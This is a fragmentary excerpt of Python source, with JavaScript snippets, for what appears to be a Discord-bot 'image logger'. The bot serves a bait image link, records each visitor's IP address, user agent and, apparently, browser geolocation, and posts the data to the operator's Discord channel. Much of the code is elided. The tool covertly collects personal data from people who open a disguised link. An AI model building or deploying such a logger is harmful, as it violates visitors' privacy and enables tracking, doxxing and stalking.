...
import traceback, requests, base64, httpagentparser, threading
import discord
...
async def on_ready():
    ...
    print(f'Logging to channel ID: {config["channel_id"]}')

@bot.command(name='setimage')
async def set_image(ctx, url: str):
    """Change the image URL used by the logger"""
    config["image"] = url
    await ctx.send(f"✅ Image URL updated to: {url}")

@bot.command(name='getimage')
async def get_image(ctx):
    """Get the current image URL"""
    await ctx.send(f"Current image URL: {config['image']}")
...
async def send_embed(embed_data):
    """Send embed to Discord channel using bot"""
    try:
...
def reportError(error):
    ...
    if bot.is_ready():
        bot.loop.create_task(send_embed(embed_data))

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot_detected = botCheck(ip, useragent)
...
if (!currenturl.includes("g=")) {
    ...
    location.replace(currenturl);});
            ...
            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord channel and report the error on the GitHub page.')
